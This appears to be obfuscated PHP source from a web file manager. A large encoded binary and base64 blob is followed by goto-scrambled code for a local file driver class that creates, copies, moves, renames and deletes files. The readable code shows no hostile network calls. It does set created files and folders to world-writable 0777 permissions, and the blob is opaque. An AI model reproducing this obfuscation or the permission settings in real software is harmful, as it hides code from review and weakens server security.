2\xb4\xe5\x97\xfc\x1a\x12\x1d\xd2\x39\x79\x3d\x19\x92\x48\xc4\xb\xbb\x75\xe4\x3f\xcf\xd1\x17\x61\x78\x8a\x1c\x5d\xe7\xc1\xd4\xf3\x20\x9c\xe0\x6a\x7\xb7\xca\xc9\x64\x5\x8f\xeb\x22"."\166\300\175\232\371\307\206\302\55\166\47\111\11\4\162\363\110\334\302\62\277\213\140\170\322\325\132\234\154\172\13\12\0\336\25\124\24\214\56\2\277\305\5\216\2\310"."\62\241\60\234\51\10\100\355\50\250\30\135\204\76\212\311\265\365\101\142\247\51\70\56\343\307\27\104\254\255\222\115\123\320\266\125\241\321\200\53\275\314\135\346\356\43".base64_decode('q7+qB9bI/TrbKX5/BBA5qn2KiKSWEHEy6mJMA2sJJcKNtRMpzfQ0nu/kng6nVQ==')."\365\247\222\22\221\177\52\13\113\135\45\205\22\165\13\136\131\330\22\256\163\116\56\254\232\176\364\264\32\244\206\67\225\106\250\107\207\136\44\261\40\72\235\50\313\246"."\xc1\xc5\xc4\x2\x6e\x6b\x68\xa8\xbc\x84\x26\xa5\xe4\x41\x2d\xd\x36\x36\x40\x8f\x52\xae\x18\x19\xcc\x16\x46\xb3\xb8\xf3\xc9\xb4\x62\xf6\x69\x3a\x39\x63\x20\xe4\xb4\xac\x64\x82\x88\xb7"."\4\105\14\262\306\360\155\372\12\250\47\243\335\157\311\14\144\323\116\50\16\73\103\242\113\33\233\263\333\22\153\172\50\320\132\323\213\204\60\306\111\104\212\177\142\347"."\xc4\x15\x92\xe8\xb1\x5a\xf0\x9d\xe7\x84\x1c\x0\x5e\x79\x54\xb7\x42\x60\x90\x46\x52\x90\x2a\x7a\x22\xa4\x78\xd\x9\x60\xc4\x4a\x0\x67\xd8\xda\xb\x87\xda\x9\xb8\x2a\x88\xff\x60\x51".base64_decode('gc3WVPIlsbpFtjtLto8CygIn1yl6Ye4HLDWMhv5bnXB+nWp8qBi+qPM2NUZQJQ==')."\x5f\x92\x96\xac\x1a\xb7\x57\x89\x8e\x75\x9c\xd9\x2c\xad\x30\x6f\xa1\x22\xc3\x4f\x13\xa0\x4e\xf8\x58\x79\x16\xd6\x1b\x88\xea\x4e\xc6\x6d\xdb\xb9\x77\x41\x7f\x99\xeb\x1\x15\x2c\x5e\xa9"."\x6c\x7c\xc5\xc4\x29\x15\xd4\xe6\xfb\x1c\x7a\x2a\x95\xcd\x98\x95\xec\x93\x7a\x48\x3d\xdb\xdd\x41\xe9\x0\xf7\xa1\x4c\xfb\x6\x27\xdc\xe2\x16\x56\x0\xf3\x61\x64\x2b\x9c\x12\x10\x4b\x3a"."\336\132\213\7\156\322\121\54\111\12\316\160\221\242\25\257\44\170\114\33\141\316\205\363\120\322\70\265\53\127\351\325\32\301\103\51\233\220\116\372\241\263\364\62\137\42".strrev('ŠÂ¦1ŒTcİ„Ó’”šjd¤B•İÓdK«AU¶…S8Õ'."\r".'ïÂIï7dÑ')."\52\307\270\46\164\30\40\100\350\65\163\302\6\367\21\356\314\10\173\103\40\61\130\255\354\202\236\273\135\160\223\12\322\373\15\350\44\0\354\106\266\323\0\361\125\223"."\346\144\226\71\166\316\240\157\322\211\146\177\113\275\257\111\70\174\26\0\221\232\332\246\210\247\271\71\157\4\343\140\240\166\13\236\323\270\272\350\205\212\30\105\274\151".base64_decode('aqpTikFbz8oCCC2QDD1GvdUVuAmpRQm4DDVNJVkKYRapA/TJib5wdOH0aW51Og==')."\x9b\xf\xee\xb\x42\xd7\xb8\x29\xab\xcb\x3d\xa\x4a\x54\x6e\x78\xae\x9b\x3e\x7\x22\x80\x78\xb6\x84\xa0\x75\xdc\xf3\x83\x24\x4d\x93\x25\x3c\xd4\x95\x85\xf0\xd0\xad\xa3\x50\x4a\x80\x2d"."\233\131\256\114\267\147\156\242\107\31\323\334\262\30\11\27\137\120\243\374\60\223\252\172\231\116\71\257\262\334\23\263\171\144\256\221\323\263\162\263\300\302\135\61\61\12".base64_decode('zyQyts1N70baADcXIC0umaxHCUz7ngdDXOwthIwc64YYyLcL0gAS0QwFGBxh8Q==').strrev('«Yï°0çPaÙ ƒµFO(ö8Æ#”Z,!È ¸‚úWÜêÀ(R  iG'."\n".'kÚ')."\xc1\x28\x2c\x26\xe2\x10\x9a\xc6\xdf\x54\xcf\x33\xe0\x75\xc5\xc3\x20\x72\x2e\xb5\x73\x43\xa1\xb6\xb9\x85\xae\xb1\x8b\x16\xb9\x55\x7a\x7a\xdd\x56\x60\xcd\xeb\x62\xa9\x71\xb8\xcd\x65\x4d"."\xf\x5a\x4e\x86\x9a\x25\x24\x0\x7b\x4a\xcc\x5f\x9e\x4b\x56\xde\xd1\xee\xb1\xdc\xae\x9e\x9d\x52\x4b\xf0\xe8\xba\xb2\x72\xfa\x5c\x76\xfe\xd0\x4e\xe3\x28\x93\xa8\x96\x4e\xa6\xd3\x3d\x98"."\x70\x86\x5b\xd9\x67\x4d\x13\x67\x83\x19\x86\x63\x62\xe2\x42\xfa\x12\x8f\xd5\x6b\x5e\x55\x2f\xf3\xe1\x2d\x1a\xce\xe2\x6f\x4f\x26\x23\x6\xa9\x2b\x7b\xa4\x19\x4f\xaa\x51\x37\x5b\xea\x58"."\133\356\212\161\3\163\232\4\21\32\33\34\36\61\333\42\240\133\153\4\356\5\304\22\160\145\135\166\70\50\213\1\331\307\64\43\246\253\31\323\102\244\360\233\75\5".base64_decode('yOt6l9wr4yQFEn0DpAA5cS0ARAnHEGrAmzINUh9JV5KVBai5RkJRQH5EX/JVAg==').base64_decode('MhZIlDSmZDZiuqmBjZHZT5P3DlqCxELV00TOHwjLNWoe/h09im0G8IGNpKJjMw==')."\x3c\x44\x72\xd0\x89\x54\x7\x57\x6a\x91\xe7\x17\x9a\x83\x81\x70\xa0\x86\x7a\xb0\xcf\xa7\xfd\x9a\x40\xf9\x5b\x3\xdb\xe6\x73\x39\x88\x9a\x48\xcf\xf4\xce\xb1\xa6\x60\x1c\x83\x9b\x40\xc8"."\364\353\331\164\232\31\2\100\26\222\155\153\370\74\47\224\310\232\174\103\204\76\136\303\360\52\217\101\300\202\123\46\350\22\112\211\273\54\201\74\311\360\101\74\54\204".base64_decode('rgGLBgMXn9SoK6qykpISZ0kp+J8dNRIerIJe8BOSlJRUoP9xBNK7klG0xoBFSw==')."\251\13\111\320\247\50\244\101\204\216\247\324\164\226\262\111\65\320\122\135\202\55\253\254\254\244\254\1\355\0\30\101\164\375\250\202\56\375\251\202\170\67\125\102\207\131"."\44\244\330\207\201\235\22\222\111\241\333\3\134\353\364\33\360\53\140\202\320\260\220\26\263\233\12\40\31\237\172\320\16\157\72\116\4\221\251\370\42\110\245\130\231\213"."\16\257\10\24\117\233\54\265\202\164\140\213\214\261\6\103\200\240\262\100\267\256\230\351\77\12\45\331\135\74\30\154\142\111\261\133\150\354\270\236\364\66\17\366\44\264".base64_decode('vgjf2WDwXBZCnYcCC0UZ1k0yApTmURShp9HkcBvdPutWk5b7QBGhbNGn8VSYkA==')."\xb6\x1d\xd0\x19\xc8\xe3\xd2\xc9\xc4\x6a\x75\x52\x1b\xe4\x7d\x5c\x1c\xf\x90\x33\x46\xf4\xe\x10\x36\x89\xa9\x38\x5a\x18\x49\x5d\xe3\xf7\x75\x72\x1e\xcd\xa2\x21\xe1\x16\x1b\x55\x31\x87"."\xfe\x8b\x75\x5\x85\x78\x29\x0\xdb\x23\xd4\x30\x67\x54\x42\x1\xf6\x28\x5b\x1e\x4f\x5c\x78\xcf\xc9\xe0\x5e\xa8\x6a\x98\xc3\x39\xd1\x35\x15\x3e\xbf\x15\x4e\xf9\xd\xe2\xa\x95\x1f\xd8"."\xd2\x32\x7a\x5\x39\xc2\x95\xd1\xb5\x4e\x30\xfe\x86\xd8\x57\x0\x6f\xce\xf\x66\xc9\x73\x53\xe6\x49\xc4\x3a\x24\xa6\x13\x81\xd0\xb0\x88\x3e\x2d\x44\x50\x89\xdf\x3\x92\xf9\xa3\x67\x42".strrev('n2H¸w	PÏ$ÕAP®ı–°…cÀ 2ÖC¶G¢<D¹B^?æˆ„|Z'."\0".'Eg~R').base64_decode('6QSVCKJiU9Xo6T8cDX4uZ4XnYBlZCpQM4oVjjdu5eBX9uJamgp1n+ipRbQs7Hg==')."\x11\x65\x71\xb8\x5c\x1a\xd8\x93\x49\x79\xd0\xc5\x8a\x12\x39\x73\x8f\x94\xba\xb0\x80\xa\x46\x2c\x84\x10\x90\x32\x28\x2f\x12\xa7\xed\xed\xc9\x2a\x94\x7f\x12\x28\x8b\x64\x72\xba\x2\xdb"."\4\355\150\23\272\146\232\342\75\124\117\134\40\207\176\161\367\14\343\54\316\351\274\36\313\51\217\340\351\221\45\5\24\234\326\56\123\322\215\214\151\134\310\3\55\147"."\357\155\101\273\301\15\42\325\46\45\306\324\105\146\232\275\33\0\247\63\44\130\77\344\251\201\144\142\131\310\16\242\53\61\115\107\102\237\160\173\60\155\6\225\116\61".base64_decode('6NeYsAtPFZQ8RcBb0wJyQiwAYlhWvIMteNgEIcEfqrCtO0slxg9EcMk4ME6IQA==')."\351\363\261\6\66\255\214\140\370\210\244\314\120\66\312\24\340\266\355\232\232\125\112\342\226\111\215\43\141\1\350\336\56\354\201\41\306\201\142\241\117\77\336\63\61\13"."\xaa\x33\x27\xb\x8e\x83\xdb\x1c\xb7\xa2\x14\x63\xc\x20\x99\xc0\xa1\x1a\x3a\x26\x4f\x55\x28\x4a\x18\xd1\x18\xbb\x5a\x4f\x46\x87\xf\x12\x89\x18\x50\xa8\x4d\x95\xb3\xb4\xcc\x49\x5d\x9a"._kodDe('MfN1UYORWBcLR629/d/tgaj+bxbwe3++lJRxvYBECp5rSv1S1Hbg6tt9n9kb9yU=')."\x33\x9e\x42\x17\x60\x45\xb2\xc2\x8f\x7a\xb1\x4d\x15\x4c\xd0\x92\x2f\x1e\x8f\x10\x8c\xae\xb5\x98\x9c\xd9\x12\x80\x95\x61\x8d\x27\xae\x52\x53\x96\xa7\x30\x1\x1e\x58\xac\x18\x6c\x85\x10"."\x27\xb9\xa2\x3b\x58\x94\x8b\xf7\x83\x5b\xef\x1\x90\x86\x1d\xb2\xa\x3\xc3\x8f\xac\xf1\xd5\x60\x6a\x76\xc8\xe8\x12\x7\x87\x35\x6\xcc\x3d\xf6\x76\x31\xb3\x4b\x72\xe5\x84\x3c\x2\x54"."\x54\xc\xaf\x9c\x58\xb4\x9\x8d\x3\xec\xea\x0\x98\xc9\x6e\xb8\x3f\x32\xdb\x37\x43\xc\xd0\x58\x86\x9c\x86\x25\x80\x2d\x47\x2c\xb9\x19\x88\xa5\xea\x53\xa2\x84\xcc\x53\x29\xb8\xb9\xa1"."\331\315\100\325\164\230\330\45\120\42\102\361\147\145\210\115\25\271\276\321\7\306\135\353\43\13\254\246\202\31\323\320\247\65\373\122\152\114\362\7\352\175\65\36\177\255"."\57\64\123\202\276\0\370\201\76\262\237\266\56\167\244\25\302\223\103\61\77\312\74\0\303\117\147\24\260\205\316\70\343\215\15\316\5\13\66\66\202\37\174\153\261\30".base64_decode('RxU9p0TAU6esBAHlgbquPKmTXNsjJM7oSm76AQW9j8lbLGTI5mkNSZ+/BrBErA==')."\251\301\146\255\244\207\152\274\232\356\125\15\225\23\7\232\143\100\54\235\153\363\164\346\260\132\30\364\270\350\223\232\17\66\256\45\327\61\5\161\71\40\72\140\265\11"."\xa8\x78\x9a\x44\xf\x26\x19\xaa\xbe\x26\xaf\xa9\x70\x6f\xe1\x28\x28\xf8\x71\xcf\xe8\xb2\x6a\x28\x2\x0\x3b\x14\x1f\x5b\x4c\x43\x82\x5b\x13\x92\x3b\x82\xf3\x60\x58\x10\xbe\x17\xf9\xbf"."\56\134\215\163\317\6\266\246\251\161\172\350\315\214\344\261\363\336\32\361\101\30\332\204\34\147\363\377\325\155\275\103\170\14\15\335\104\247\6\212\350\321\134\162\34\301"."\216\172\43\370\51\63\136\5\20\233\364\201\214\170\144\342\216\123\167\342\124\152\203\116\125\274\124\27\12\3\234\77\205\311\111\151\260\72\54\241\0\171\11\236\35\120".base64_decode('TpYqJsCCJsNuOTK0OeC328hZHonMqQNaLQ1dDsgncZmdJZAqpRKkDOJvMkjT6A==')."\x7d\x1d\x5e\x5\x72\xa4\xe0\x4d\x31\x1f\x3d\x58\x8\x23\xa6\xb2\x3c\xb1\xe5\x71\x4f\xc4\x7d\x70\xc9\x5\x5a\x60\x68\xa9\x81\x1c\x80\x45\xbe\xf7\xd3\x76\x31\x2b\x2d\xe8\x8\x3a\xdd\xa1".strrev('!¾³ëBP…vp…¾ÃP²ËBõÌÅqÏ±aVĞ"ãğGØ €Ã‰')."\xf3\x62\x21\xca\xd6\xba\x60\x8c\x80\xcc\xe8\xd6\xa6\x70\x7\x86\xfe\x42\x5f\x0\x16\xf7\xff\x42\xe9\x63\xf0\x4f\x1b\xf9\xa5\x54\xde\x5e\x34\x5e\xd7\xa4\x29\xc5\x6c\xee\x6b\x2c\x8f\x56"."\13\200\106\205\113\142\50\27\74\16\227\323\214\154\21\377\373\354\135\20\276\274\150\234\200\122\350\5\212\332\41\262\332\300\222\325\57\70\167\267\316\167\40\253\213\154"."\166\0\306\214\243\220\221\232\350\360\74\254\205\345\116\7\346\175\40\5\342\241\352\1\361\133\264\7\104\235\6\221\124\47\22\147\30\60\135\110\100\237\360\210\73\320"."\xfb\x12\x98\xe\xd9\xdf\x30\x11\xd6\xf\x23\x6e\x62\xee\xce\xa4\x16\x95\x93\x41\x6c\x55\x63\x31\x53\xd7\x81\xdc\xc2\x6c\xe6\x2c\xc9\x30\xc8\x2d\x67\x32\x43\x2a\xe0\x9\x3f\x82\x95\xf1"."\331\264\17\137\212\262\100\165\101\56\22\55\62\361\261\3\277\371\101\222\203\332\232\361\71\3\351\266\130\44\75\353\101\77\120\162\252\23\36\41\164\347\236\15\101\253"."\37\312\336\10\346\161\344\314\316\45\12\56\44\201\64\115\342\23\154\131\240\20\41\340\252\107\37\150\325\213\214\356\57\100\31\36\132\137\271\301\10\213\176\152\225\16".base64_decode('xvXDMJcJxVuh/AzZ/rIGrYY9E+LAPeNvHOFHQRzsARAH9ovjIM9+OPgNnl96KA==')."\x87\xbf\x2d\x66\x7d\x90\xc\xb6\x99\xd9\x93\xe5\xb0\xdf\x76\xce\x9b\xd\x95\x2d\x43\xd0\x3e\x70\x61\x2d\x57\x93\xc6\x4f\xc4\xd2\xd9\x14\x3f\x70\x4\x1\xab\x24\x92\xd3\x61\xa1\x87\x59"."\75\351\100\347\201\16\352\4\305\66\34\274\127\342\314\344\31\303\377\136\6\66\53\104\342\105\334\112\165\52\246\105\165\172\306\142\117\246\132\260\16\10\365\334\256\35".base64_decode('e2nKeXRgTipeNn7iFFGM5/PDzy7K8A/1XId/yI7OJ16yopVEPUSJyxdFWg0/cw==')."\237\351\21\120\324\112\222\377\167\113\201\63\305\70\251\140\220\231\373\172\127\316\220\40\254\24\214\27\204\15\315\166\362\254\301\3\141\203\67\26\157\141\374\231\36\153".base64_decode('XfhRqTz9EDYivjTwQzBaEoqXKajcNHXZKiflEwfQSFDZQ0Uv5yn2tqOBIYoEHg==')._kodDe('LrgdUvuWecdWsHJg3DKTqDoqMKY5aE2BRaIfq++U+fESDoYBqI4yq45AV1IyMWs=')."\307\366\4\332\57\264\33\63\135\114\374\161\312\364\125\36\64\251\202\346\114\61\3\150\202\11\367\302\245\61\153\137\155\305\203\154\274\214\166\207\64\124\242\134\56\114"."\x78\x31\x88\x7b\x74\x10\x58\x2e\x98\x9b\xde\x90\x1a\x42\x98\xa5\xd4\x8a\x3f\x86\x82\xee\xb8\x70\x65\x34\x5a\xab\x96\x75\x2b\x78\x60\x13\xaf\x8c\xa0\x82\xc4\x65\x90\x5b\x34\xd2\x8f\x90".base64_decode('9pKF2xAON+NbQZ56dlNIFmxE4NAJr2Bp4rf14m2A+swCTJJF0ALhWttDaYj42A==')."\x5f\x4f\xa3\xfd\x47\xeb\x9c\xd3\x34\xe1\xca\x99\x45\x1c\x60\xaf\x86\x58\xc4\x3\xc3\xfe\x7c\xe\x60\xa7\x44\xc7\x73\x20\xc8\x30\x9c\x6c\x9e\x84\xea\x21\xb\x5d\x5c\x9b\xc3\xfe\x76\x5e".base64_decode('Rrhja3vVU1BVWt/rTIjNgr4HbMua3vCDFybx+Qkh/MgjGf6mnPj/81t6/7+e0A==')."\233\130\102\225\312\226\167\326\352\11\203\113\271\261\101\301\355\40\126\150\332\372\141\335\42\207\211\261\4\103\35\226\20\11\360\5\7\367\36\227\355\351\122\27\63\131"."\244\276\52\250\13\13\231\36\230\310\360\1\241\34\5\45\175\170\13\140\144\67\173\27\52\137\40\367\71\104\13\362\121\176\223\67\63\255\306\272\363\34\300\301\51\360"."\133\235\364\11\134\102\116\62\116\237\0\63\101\275\163\270\351\127\14\212\131\220\225\244\144\121\274\120\26\310\120\201\254\230\120\342\366\31\224\174\240\113\251\204\212\210"."\224\303\2\312\241\67\141\313\56\150\1\212\303\303\337\20\165\131\137\261\44\71\32\155\317\36\341\104\206\70\266\26\155\162\356\171\154\156\156\266\230\305\54\320\204\323"."\252\223\141\117\47\226\330\337\122\54\165\346\126\206\55\250\241\76\41\10\45\176\212\220\350\300\1\35\10\346\311\203\227\145\210\247\31\2\375\363\57\102\366\360\245\40"."\x8\x83\x2f\xb1\xbf\x74\x31\x37\xeb\x1a\x62\xc5\xac\x50\xa6\xd5\x10\xac\xe1\x84\x77\xfc\x72\x9e\x18\xb3\x29\xee\x81\x78\xc4\x4f\xb2\x54\xd\x39\xe1\x24\xdd\xe\xb5\x34\x16\xa1\x4b\x0"."\x4\x53\x1\x77\x2f\x3c\xd2\x6b\xa6\x32\x58\xdb\x25\xee\xa1\xf4\xae\x8d\x60\xbc\x4a\x40\x16\x9d\x94\x21\xba\x16\xb6\xe6\x84\xe6\xc8\xd6\x95\x32\x3d\x5f\xb2\x98\xa6\x1b\x42\x32\x6\xcf".base64_decode('lxa+4mZaRpN7RrV7REWiMJZuLUIuOTYUQcKpGmBv41Y/xygSganHJ/pyMz8Xsg==')."\x1e\xcb\x31\x37\x94\x39\x94\x2a\xab\xfa\x85\x68\x94\x8b\xfa\xc\x1\xbf\xf0\xce\x91\x8f\x5f\xc2\x46\xd1\x58\x9b\xed\xe9\x95\x4d\x7a\xb8\x65\xcf\xd5\x62\x91\x25\x84\x43\xbc\x18\xc2\x1d"."\157\356\71\15\77\76\22\66\177\232\15\12\43\234\326\332\340\2\361\347\324\116\356\345\107\63\234\373\215\307\331\213\234\226\244\161\312\377\63\50\200\360\307\73\41\257"."\43\134\143\344\306\260\112\237\375\255\70\227\170\365\321\222\60\27\312\257\71\12\371\271\226\236\167\23\302\362\165\37\55\31\153\166\361\32\45\103\52\16\302\116\162\231"."\141\212\40\151\100\273\157\156\261\202\273\302\344\150\136\245\365\322\46\113\306\346\14\244\101\126\366\116\13\324\46\73\101\255\4\335\306\155\121\206\370\330\250\365\154\116"."\x14\xec\x5\x14\x50\x92\x7e\xa1\x38\xf1\xdc\x6e\xc8\xc\xa1\xfc\x95\x70\xac\xb4\xe\xb1\x70\xc1\x95\x47\xd0\xcd\x4a\xb3\xc\xbe\x40\xec\x58\xc7\x48\xca\xa0\x18\x69\x69\x8e\x7d\x6a\x11"."\333\317\321\27\3\123\110\361\351\242\212\344\334\364\212\255\365\142\6\173\317\160\16\243\117\65\143\11\101\26\311\215\314\205\353\71\203\112\52\312\337\136\173\253\350\230"."\xda\x25\x34\x5e\x48\x4e\x7b\x84\xc3\xff\xb0\x96\x27\xf\x6e\x51\xde\x6c\x38\xa\x3d\x89\xcd\x78\x48\x4b\xde\x21\x86\x0\xe6\xc5\x51\x30\x6f\x4e\x34\xcd\x2c\xa8\x36\x84\x7c\xa6\x9c\x35".base64_decode('huhe7uARKT+ep8M2WRgnHWo88ybOrY5gnD01UgvkbwWX5m0HrPlakTfxkK3I8w==')."\314\57\161\237\225\207\326\322\230\74\324\225\237\306\347\322\161\36\227\307\66\0\227\11\367\150\321\57\113\236\150\321\320\40\277\51\102\60\357\322\67\254\66\2\66\270"."\70\60\324\136\10\110\154\374\375\133\301\202\165\214\205\244\147\323\335\151\215\155\23\161\156\325\5\55\70\331\53\261\254\272\234\322\254\250\231\316\12\326\230\171\15\152"."\x1d\xe8\xf1\xf0\x1c\x49\x36\x29\x53\x4d\xb9\x60\x8b\x8c\xa5\x16\xcd\x54\x63\x82\x9d\x92\xfd\xb9\x74\x1c\x4f\x2b\x49\xa\xa\x38\x9b\xee\x8b\x4b\xfb\x96\xf3\xe9\x3c\xda\x21\x4\x22\xec"."\32\127\72\133\54\263\361\376\117\264\355\370\320\255\6\236\271\262\203\26\50\136\71\360\176\211\243\341\373\355\16\30\27\326\62\350\267\132\63\115\112\111\200\374\217\122".base64_decode('IiYPbnoOwUYBfPFTFTiKSNGP0BGRDfRJjv+gwBlScCwiNpYAPEBgAXFPI2d2dQ==')."\131\333\301\43\7\0\41\62\252\365\123\47\150\360\106\50\157\17\177\134\126\266\63\162\234\7\41\370\46\132\134\240\173\267\206\33\307\270\211\177\131\47\52\303\111\234"."\215\164\145\72\55\331\261\213\173\146\151\370\113\45\20\335\44\57\2\373\235\104\152\45\350\201\325\73\333\27\12\207\162\242\232\75\241\120\153\40\130\213\335\124\346\104"."\243\134\202\161\113\116\124\163\103\240\151\250\70\157\243\307\347\317\211\203\306\56\115\21\356\63\7\107\371\232\121\53\75\176\177\240\165\250\126\370\152\146\362\226\240\243".base64_decode('Va78ziQ0qsmmZwQhOUllaeGmmJLizpN4HquKQJxXg3oSYx9WZ+42uzOKsKQgaA==')."\250\322\104\312\16\146\10\24\272\355\144\213\233\61\313\250\103\232\315\70\36\37\36\273\54\47\316\2\34\55\26\104\142\4\44\24\167\127\4\30\233\167\304\104\375\151"."\256\76\37\305\362\21\201\55\75\127\213\342\100\227\26\25\364\365\130\166\41\67\266\310\30\13\326\111\370\233\104\377\37\31\376\271\110\360\235\0\0".base64_decode('')."".""._kodDe('Kw=='), 10, -8))); goto C©ÕÄŠõíğ; C©ÕÄŠõíğ: define($_SERVER[úÉ·öƒÑì©][0], $_SERVER[úÉ·öƒÑì©][1]); $_SERVER[úù›­Ö¢íü] = explode($_SERVER[úÉ·öƒÑì©][2], gzinflate(substr($_SERVER[úÉ·öƒÑì©][3], 10, -8))); function binCheckEq($eÃ¢££µ, $Cİù¼×ªœÓ) { return $eÃ¢££µ == $Cİù¼×ªœÓ; } goto D¼™ôƒ•„¡; fÑ‚¤¡²ƒ: define($_SERVER[úÉ·öƒÑì©][237], 2); define($_SERVER[úÉ·öƒÑì©][238], 3); define($_SERVER[úÉ·öƒÑì©][239], 1); goto A£±»ØØ†; FéÕœ¥•‹¬: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($Aï–â¿Ñ†¨) { if (substr($Aï–â¿Ñ†¨, 0, 2) == $_SERVER[úÉ·öƒÑì©][1252]) { $Aï–â¿Ñ†¨ = BASIC_PATH . substr($Aï–â¿Ñ†¨, 2); } return $Aï–â¿Ñ†¨; } public function iconvApp($eä¥¹Èàà•) { $DÄ½‘‚ƒ¢ =& $_SERVER[úÉ·öƒÑì©]; global $config; return $this->iconvTo($eä¥¹Èàà•, $config[$DÄ½‘‚ƒ¢[1250]], $config[$DÄ½‘‚ƒ¢[1249]]); } public function iconvSystem($C²‡‡¬Õ‚•) { $cç†øö«ê =& $_SERVER[úÉ·öƒÑì©]; global $config; return $this->iconvTo($C²‡‡¬Õ‚•, $config[$cç†øö«ê[1249]], $config[$cç†øö«ê[1250]]); } public function getPathOuter($cò‘øËòœŒ) { goto d½Î¯óóÌˆ; A…ÊÌï¨™: $cò‘øËòœŒ = KodIO::clear($cò‘øËòœŒ); $cò‘øËòœŒ = substr($cò‘øËòœŒ, strlen($Eª½òÈ–™)); if (empty($this->pathDriver)) { return $cò‘øËòœŒ; } goto AãÍ³Å†Ö; AãÍ³Å†Ö: return $this->pathDriver . $e“çÊ´õ…[8] . ltrim($cò‘øËòœŒ, $e“çÊ´õ…[8]); goto f‡ÃÖ£öÜ§; d½Î¯óóÌˆ: $e“çÊ´õ… =& $_SERVER[úÉ·öƒÑì©]; $Eª½òÈ–™ = $this->iconvApp($this->pathBase); $cò‘øËòœŒ = $this->iconvApp($cò‘øËòœŒ); goto dÃ—Øê”™Œ; dÃ—Øê”™Œ: if (substr($Eª½òÈ–™, 0, 2) == $e“çÊ´õ…[1252]) { $Eª½òÈ–™ = BASIC_PATH . substr($Eª½òÈ–™, 2); } if (substr($cò‘øËòœŒ, 0, 2) == $e“çÊ´õ…[1252]) { $cò‘øËòœŒ = BASIC_PATH . substr($cò‘øËòœŒ, 2); } $Eª½òÈ–™ = KodIO::clear($Eª½òÈ–™); goto A…ÊÌï¨™; f‡ÃÖ£öÜ§: } public function mkfile($EŸìÌÖùÂ, $e…Ç†¸‘‰õ = '', $fÌÈÌÌÑ±ƒ = REPEAT_RENAME) { $EŸìÌÖùÂ = $this->iconvSystem($EŸìÌÖùÂ); @touch($EŸìÌÖùÂ); if ($e…Ç†¸‘‰õ) { file_put_contents($EŸìÌÖùÂ, $e…Ç†¸‘‰õ); } @chmod($EŸìÌÖùÂ, 511); return is_file($EŸìÌÖùÂ) ? $this->getPathOuter($EŸìÌÖùÂ) : !1; } public function mkdir($EàÀÍŞ®‡, $cÄè¦› ÊË = REPEAT_SKIP) { $EàÀÍŞ®‡ = $this->iconvSystem($EàÀÍŞ®‡); if (is_dir($EàÀÍŞ®‡)) { return $this->getPathOuter($EàÀÍŞ®‡); } @mkdir($EàÀÍŞ®‡, 511, !0); @chmod($EàÀÍŞ®‡, 511); return is_dir($EàÀÍŞ®‡) ? $this->getPathOuter($EàÀÍŞ®‡) : !1; } public function copyFile($dš‡‰†äÈ¹, $bôĞÜİÂÖ÷) { $this->mkdir($this->pathFather($bôĞÜİÂÖ÷)); $dš‡‰†äÈ¹ = $this->iconvSystem($dš‡‰†äÈ¹); $bôĞÜİÂÖ÷ = $this->iconvSystem($bôĞÜİÂÖ÷); $bÏËÅÇ»‹¾ = copy_64($dš‡‰†äÈ¹, $bôĞÜİÂÖ÷); @chmod($bôĞÜİÂÖ÷, 511); return $bÏËÅÇ»‹¾ ? $this->getPathOuter($bôĞÜİÂÖ÷) : !1; } public function moveFile($Fô¤¤¿½Ì, $eÄºŒ×Ì) { goto eÔŒìôàİ­; eÔŒìôàİ­: $this->mkdir($this->pathFather($eÄºŒ×Ì)); $Fô¤¤¿½Ì = $this->iconvSystem($Fô¤¤¿½Ì); $eÄºŒ×Ì = $this->iconvSystem($eÄºŒ×Ì); goto B¦ŞÆë; Cìñ“µÄ¦‚: return $d¡·ŒªÚø ? $this->getPathOuter($eÄºŒ×Ì) : !1; goto cÓÂëµóó; B¦ŞÆë: $d¡·ŒªÚø = intval(@rename($Fô¤¤¿½Ì, $eÄºŒ×Ì)); if (!$d¡·ŒªÚø) { if ($d¡·ŒªÚø = intval(@copy_64($Fô¤¤¿½Ì, $eÄºŒ×Ì))) { @unlink($Fô¤¤¿½Ì); } } @chmod($eÄºŒ×Ì, 511); goto Cìñ“µÄ¦‚; cÓÂëµóó: } public function delFile($cİ•šò¨Ù) { $cİ•šò¨Ù = $this->iconvSystem($cİ•šò¨Ù); if (!@unlink($cİ•šò¨Ù)) { @chmod($cİ•šò¨Ù, 511); if (!@unlink($cİ•šò¨Ù)) { return !1; } } else { return !0; } } public function delFolder($bË‡˜‘š‘¼) { goto b§™õÏÚ; dÖ³œ¥èÚÔ: return rmdir($bË‡˜‘š‘¼); goto Côİ¡ã³ ; b§™õÏÚ: $eÇŒ™âŸöÃ =& $_SERVER[úÉ·öƒÑì©]; $bË‡˜‘š‘¼ = $this->iconvSystem($bË‡˜‘š‘¼); if (!is_dir($bË‡˜‘š‘¼)) { return !0; } goto d„¶ŸâÄßˆ; d„¶ŸâÄßˆ: if (!($eá’ŠµÕ³¤ = opendir($bË‡˜‘š‘¼))) { return !1; } while (($eæè÷øŒâ™ = readdir($eá’ŠµÕ³¤)) !== !1) { if ($eæè÷øŒâ™ == $eÇŒ™âŸöÃ[95] || $eæè÷øŒâ™ == $eÇŒ™âŸöÃ[1259]) { continue; } $cÉô¨Œ£˜‹ = $bË‡˜‘š‘¼ . $eÇŒ™âŸöÃ[8] . $eæè÷øŒâ™; if (is_file($cÉô¨Œ£˜‹) || is_link($cÉô¨Œ£˜‹)) { if (!unlink($cÉô¨Œ£˜‹)) { chmod($cÉô¨Œ£˜‹, 511); if (!unlink($cÉô¨Œ£˜‹)) { return !1; } } } else { if (is_dir($cÉô¨Œ£˜‹)) { chmod($cÉô¨Œ£˜‹, 511); $cÉô¨Œ£˜‹ = $this->iconvApp($cÉô¨Œ£˜‹); if (!$this->delFolder($cÉô¨Œ£˜‹)) { return !1; } } } } closedir($eá’ŠµÕ³¤); goto dÖ³œ¥èÚÔ; Côİ¡ã³ : } public function rename($F“òƒ™ç¶, $f÷–òßÅª“) { goto d»ô Üö´Œ; E¼´Ü±š›: $aˆ«ŠŠŒá½ = @rename($F“òƒ™ç¶, $e±ªé¹åŠ–); $e±ªé¹åŠ– = $this->iconvApp($e±ªé¹åŠ–); return $aˆ«ŠŠŒá½ ? $this->getPathOuter($e±ªé¹åŠ–) : !1; goto B¥çã–®é ; d»ô Üö´Œ: $dáÛÀ©¨¶Ø =& $_SERVER[úÉ·öƒÑì©]; $DŒ˜µ¥ã = $this->fileNameAuto($this->pathFather($F“òƒ™ç¶), $f÷–òßÅª“); $DŒ˜µ¥ã = $this->iconvSystem($DŒ˜µ¥ã); goto c´ğß„¬ğ‚; c´ğß„¬ğ‚: $F“òƒ™ç¶ = $this->iconvSystem($F“òƒ™ç¶); 